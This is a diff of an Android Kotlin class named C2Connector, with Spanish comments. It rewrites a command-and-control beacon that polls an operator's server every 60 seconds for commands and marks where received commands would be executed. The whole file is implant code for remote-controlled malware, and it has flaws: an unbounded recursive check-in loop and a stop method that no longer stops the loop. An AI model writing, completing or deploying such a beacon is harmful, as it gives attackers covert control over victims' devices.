@@ -2,69 +2,59 @@ package com.phantom.os.network
 
 import android.content.Context
 import android.util.Log
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.Job
-import kotlinx.coroutines.launch
-import okhttp3.Call
-import okhttp3.Callback
-import okhttp3.OkHttpClient
-import okhttp3.Request
-import okhttp3.Response
-import java.io.IOException
+import java.io.BufferedReader
+import java.io.InputStreamReader
+import java.net.HttpURLConnection
 import java.net.URL
 
 class C2Connector(private val context: Context) {
 
     companion object {
         const val TAG = "C2Connector"
-        // Cambia esto por la IP de tu servidor VPS o dominio
-        private const val SERVER_URL = "http://TU_IP_SERVIDOR:8080/api/v1/checkin" 
+        // IP de ejemplo (cámbiala por la de tu servidor)
+        private const val SERVER_URL = "http://192.168.1.100:8080/checkin" 
     }
 
-    private val client = OkHttpClient()
-    private var job: Job? = null
-
     fun startListening() {
-        Log.d(TAG, "📡 Starting C2 Listener...")
+        Log.d(TAG, "📡 Inicializando conexión nativa...")
         checkIn()
     }
 
     private fun checkIn() {
-        val request = Request.Builder()
-            .url(SERVER_URL)
-            .get()
-            .addHeader("Content-Type", "application/json")
-            .build()
+        Thread {
+            try {
+                val url = URL(SERVER_URL)
+                val connection = url.openConnection() as HttpURLConnection
+                connection.requestMethod = "GET"
+                connection.connectTimeout = 5000
+                connection.readTimeout = 5000
 
-        client.newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: IOException) {
-                Log.e(TAG, "❌ Connection failed", e)
-                // Reintentar en 30 segundos
-                retryConnection(30000L)
-            }
-
-            override fun onResponse(call: Call, response: Response) {
-                response.body?.string()?.let { payload ->
-                    Log.d(TAG, "✅ Received command: $payload")
-                    // Aquí procesarías los comandos recibidos
+                val responseCode = connection.responseCode
+                
+                if (responseCode == HttpURLConnection.HTTP_OK) {
+                    val reader = BufferedReader(InputStreamReader(connection.inputStream))
+                    val response = reader.readText()
+                    Log.d(TAG, "✅ Comando recibido: $response")
+                    // Aquí llamarías a tu procesador de comandos
+                } else {
+                    Log.e(TAG, "❌ Error de conexión: $responseCode")
                 }
-                // Siguiente check-in en 60 segundos
-                retryConnection(60000L)
+                
+                connection.disconnect()
+                
+                // Reintentar en 60 segundos
+                Thread.sleep(60000)
+                checkIn()
+                
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Excepción en C2", e)
+                Thread.sleep(30000) // Espera más si hay error
+                checkIn()
             }
-        })
-    }
-
-    private fun retryConnection(delayMs: Long) {
-        job?.cancel()
-        job = CoroutineScope(Dispatchers.IO).launch {
-            kotlinx.coroutines.delay(delayMs)
-            checkIn()
-        }
+        }.start()
     }
 
     fun stopListening() {
-        job?.cancel()
-        Log.d(TAG, "🔌 C2 Listener Stopped")
+        Log.d(TAG, "🔌 Conexión detenida")
     }
 }
